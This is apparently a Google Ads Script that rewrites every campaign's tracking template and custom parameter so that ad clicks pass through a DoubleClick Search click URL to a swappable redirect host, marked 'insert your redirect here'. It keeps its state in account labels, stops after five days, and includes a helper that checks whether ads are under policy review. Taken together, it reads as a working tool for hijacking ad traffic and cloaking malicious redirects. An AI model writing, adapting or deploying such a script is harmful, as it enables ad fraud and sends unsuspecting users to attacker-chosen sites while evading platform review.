function main() {
    const delayInMinutes = 3;
    var attempts = 0;
    var delay = delayInMinutes * 60 * 1000;
    while (true) {
        main_();
        attempts++;
        if (29 < delayInMinutes * attempts) return;
        Utilities.sleep(3 * 60 * 1000);
    }
}
function main_() {
    const labels = getLabels();
    const toMix = shouldMixer(labels.remember);
    // Logger.log(labels);
    var currentAccount = AdsApp.currentAccount();
    var adsAccount = currentAccount.getCustomerId();
    Logger.log(toMix);
    // const doInsertTemplate = canInsertTemplate();
    if (toMix) {
        const options = {
            customParameter_uurl: getUrl(), // insert your redirect here
            trackingTemplate:
                "https://clickserve.dartsearch.net/link/click?{_dssagcrid}&{_dssftfiid}&ds_e_adid={creative}&ds_e_matchtype={ifsearch:search}{ifcontent:content}&ds_url_v=2&ds_dest_url={_uurl}/?url={lpurl}",
            insertCustomParameter: true,
            insertTrakingTemplate: true,
            levelCustomParameter: "CAMPAIGN", // AD_GROUP | CAMPAIGN
            levelTrakingTemplate: "CAMPAIGN", // AD_GROUP | CAMPAIGN
        };

        var campaignsIterator = AdsApp.campaigns().get();
        var groupsIterator = AdsApp.adGroups().get();

        while (campaignsIterator.hasNext()) {
            var object = campaignsIterator.next();
            if (options.insertCustomParameter && options.levelCustomParameter == "CAMPAIGN") {
                Logger.log('levelCustomParameter == "CAMPAIGN"');
                object.urls().setCustomParameters({ uurl: options.customParameter_uurl });
            }
            if (labels.tt && options.insertTrakingTemplate && options.levelTrakingTemplate == "CAMPAIGN") {
                object.urls().setTrackingTemplate(options.trackingTemplate);
            }
        }

        while (groupsIterator.hasNext()) {
            var object = groupsIterator.next();
            if (options.insertCustomParameter && options.levelCustomParameter == "AD_GROUP") {
                object.urls().setCustomParameters({ uurl: options.customParameter_uurl });
            }
            if (labels.tt && options.insertTrakingTemplate && options.levelTrakingTemplate == "AD_GROUP") {
                object.urls().setTrackingTemplate(options.trackingTemplate);
                AdsApp.createLabel("tt", "TRUE", "blue");
            }
        }
    }
}

function shouldMixer(remember) {
    if (!remember) {
        remember = new Date().getTime();
        AdsApp.createLabel("remember", "" + remember, "blue");
    }
    const diff = new Date().getTime() - Number(remember);
    const limit = 5 * 24 * 60 * 60 * 1000;
    Logger.log(diff);
    Logger.log("" + limit);
    if (diff > limit) {
        return false;
    }
    return true;
}

function getLabels() {
    const labels = {};
    var lbls = AdsApp.labels().get();
    Logger.log(lbls.totalNumEntities());
    while (lbls.hasNext()) {
        var lbl = lbls.next();
        //Logger.log(lbl.getName() + " : " + lbl.getDescription());
        labels[lbl.getName()] = lbl.getDescription();
    }
    return labels;
}

function canInsertTemplate() {
    var eligible = true;
    var adsIter = AdsApp.ads().get();
    if (adsIter.totalNumEntities() == 0) {
        eligible = false;
    }
    while (adsIter.hasNext()) {
        var ad = adsIter.next();
        var policyApprovalStatus = ad.getPolicyApprovalStatus();
        if (policyApprovalStatus == "UNDER_REVIEW") {
            eligible = false;
        }
    }
    //Logger.log(eligible);
    return eligible;
}

function getUrl() {
    var urls = ["https://google.com", "https://google2.com", "https://google3.com"];
    return urls[Math.floor(Math.random() * urls.length)];
}
